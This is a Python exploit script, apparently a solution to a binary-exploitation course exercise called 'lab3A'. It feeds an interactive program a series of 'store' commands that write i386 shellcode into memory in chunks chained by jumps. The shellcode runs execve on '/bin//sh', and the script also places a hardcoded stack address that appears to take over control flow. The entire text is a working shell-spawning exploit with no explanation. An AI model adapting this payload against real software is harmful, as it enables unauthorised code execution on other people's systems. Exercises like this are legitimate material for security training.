import sys

start = [109,
         97, 98,
         79, 80,
         82, 83,
         85, 86,
         88, 89,
         91, 92,
         94, 95,
         ]
# shellcode lab3A.s
# nasm -f elf32 lab3A.s
# ld -m elf_i386 -o lab3A lab3A.o
# objdump -d lab3A
shellcode = [0xbffff644,
             0x6e69622f, 0x68732f2f,
             0xee83e689, 0x90e6ff70,
             0xc6830bb0, 0x90e6ff0c,
             0xc683d231, 0x90e6ff0c,
             0xc683c931, 0x90e6ff0c,
             0x8334ec83, 0xe6ff0cc6,
             0x3151e389, 0x9080cdf6,
             ]

buf = ''
for i in range(len(shellcode)):
    input_ = "%u" % shellcode[i]
    buf += "store\n"
    buf += str(input_)
    buf += '\n'
    index_ = str(start[i])
    buf += str(index_)
    buf += '\n'

buf += "quit\n"
sys.stdout.write(buf)
